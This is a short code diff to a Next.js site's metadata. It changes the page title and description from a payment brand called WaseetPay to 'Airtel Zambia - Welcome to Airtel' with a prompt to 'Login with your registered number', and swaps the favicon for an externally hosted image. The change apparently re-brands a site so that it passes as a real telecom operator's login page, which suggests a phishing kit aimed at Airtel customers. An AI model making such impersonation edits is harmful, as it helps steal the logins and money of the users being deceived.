@@ -10,10 +10,10 @@ const cairo = Cairo({
 })
 
 export const metadata: Metadata = {
-  title: "وسيط باي | WaseetPay",
-  description: "ادفع، حوّل، واشترِ بسهولة وأمان مع وسيط باي",
+  title: "Airtel Zambia - Welcome to Airtel",
+  description: "Welcome to Airtel Zambia - Login with your registered number",
   icons: {
-    icon: "https://is1-ssl.mzstatic.com/image/thumb/PurpleSource211/v4/87/ae/5f/87ae5fa1-5f59-8287-5eed-960ccc48750c/Placeholder.mill/400x400bb-75.webp",
+    icon: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTuUIYILCH57PwwcpNDvCJfl0Fw53NfBSKqOpReSVfSJMDiw4OO8w&s&ec=121966380",
   },
 }
 
